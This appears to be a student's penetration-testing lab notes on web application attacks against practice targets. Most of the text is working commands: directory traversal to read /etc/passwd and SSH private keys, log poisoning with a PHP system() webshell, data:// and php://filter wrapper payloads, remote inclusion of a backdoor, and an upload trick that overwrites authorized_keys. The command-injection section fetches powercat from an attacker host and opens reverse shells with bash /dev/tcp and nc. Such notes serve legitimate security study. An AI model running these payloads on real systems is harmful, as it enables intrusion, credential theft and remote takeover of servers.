## Directory traversal
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd

http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

*gets the ssh key*

chmod 400 dt_key

ssh -i dt_key -p 2222 offsec@mountaindesserts.com

*note: ssh may have trouble reading the file if saved in vscode, nano fixed it. probably utf-8 thing or line endings*

### golang example for golangexample cve-2021-43798
curl --path-as-is -> will not normalize the path (ie resolve ../ etc)
curl -v --path-as-is "http://192.168.214.193:3000/public/plugins/alertlist/../../../../../../../../../../../Users/install.txt"

### special characters 192.168.214.16
curl http://192.168.214.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords

curl -v --path-as-is "http://192.168.214.16:3000/public/plugins/alertlist/../../../../../../../../../../../opt/install.txt"

../ -> %2e%2e/

can be used to bypass filters by using URL encoding (percent encoding)

### Local File Inclusion LFI
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

inject php code: <?php echo system($_GET['cmd']); ?>
*using user-agent field into the vulnerable file (access.log above on linux, xampp\apache\logs\access.log windows*

build commands with get request (in burp) GET /meteor/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt

*&cmd= causes whatever comes after to be executed by the php echo that was injected*

reverse shell

bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.x.x%2F4444%200%3E%261%22

listener

nc -nvlp 4444

### php wrappers
php://

data://

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

get base64 encoding of a command

echo -n '<?php echo system($_GET["cmd"]);?>' | base64

PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

**inject command and run cmd= whatever at the end, URL encode the commands ie %20 for space etc**

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"


### remote file inclusion
/usr/share/webshells/php/simple-backdoor.php -> on kali

python3 -m http.server 80 -> start sharing files from our current working directory (so the simple-backdoor.php directory)

**be sure to update target address (url) and our address page=http://<our ip>
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

**reverse shell**

https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### File upload vulnerabilities
### executable files
use in page file uploads to upload files...

curl http://192.168.214.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

curl "http://192.168.214.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt"

curl "http://192.168.214.16/simple-backdoor.pHP?cmd=cat%20/opt/install.txt" 

### non executable files

ssh-keygen

cat fileup.pub > authorized_keys

upload file and intercept with burp, change filename to ../../root/.ssh/authorized_keys

rm ~/.ssh/known_hosts

ssh -p 2222 -i fileup root@192.168.214.16

### command injection
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive

curl -X POST --data 'Archive=git version' http://192.168.214.189:8000/archive

curl -X POST --data 'Archive=git version%3Bipconfig' http://192.168.214.189:8000/archive

#### find out if is cmd or powershell
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.214.189:8000/archive

python3 -m http.server 80 -> create python web server to deliver powercat

**download on the target from us our reverse shell**
curl -X POST --data 'Archive=git version%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.217%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.217%20-p%204444%20-e%20powershell' http://192.168.214.189:8000/archive

**create remote shell on target to self with nc**

url -X POST --data 'Archive=git version%3bnc%20192.168.45.217%204444%20-e%20%2Fbin%2Fbash' http://192.168.214.16/archive
